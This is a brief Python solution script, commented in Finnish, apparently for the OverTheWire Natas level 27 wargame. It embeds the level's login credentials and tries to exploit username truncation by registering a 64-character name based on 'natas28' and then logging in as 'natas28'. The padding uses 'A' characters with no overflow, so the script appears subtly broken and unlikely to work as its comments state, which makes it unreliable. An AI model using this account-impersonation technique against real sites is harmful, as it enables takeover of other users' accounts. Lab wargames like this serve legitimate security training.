import requests
# LEVEL 27 NATAS
auth_user = 'natas27'
auth_pass = 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'
url = 'http://natas27.natas.labs.overthewire.org/index.php'

# Luo käyttäjänimi, joka on täsmälleen 64 merkkiä
base = 'natas28'
padding = 'A' * (64 - len(base))
crafted_username = base + padding
password = 'mypassword'

# Vaihe 1: Luo uusi käyttäjä
create = requests.post(url, auth=(auth_user, auth_pass), data={
    'username': crafted_username,
    'password': password
})

# Vaihe 2: Kirjaudu sisään pelkällä 'natas28'
login = requests.post(url, auth=(auth_user, auth_pass), data={
    'username': base,
    'password': password
})

print(login.text)
